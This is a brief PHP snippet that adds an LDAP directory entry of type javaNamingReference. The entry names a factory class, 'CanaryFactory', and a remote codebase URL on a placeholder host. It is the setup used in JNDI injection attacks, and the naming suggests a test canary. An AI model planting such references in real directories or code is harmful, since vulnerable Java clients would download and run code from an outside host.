<?php
$entry = [
    'objectClass' => ['javaNamingReference'],
    'javaFactory' => ['CanaryFactory'],
    'javaCodeBase' => ['https://delivery.example.invalid/classes/'],
];
ldap_add($connection, $dn, $entry);
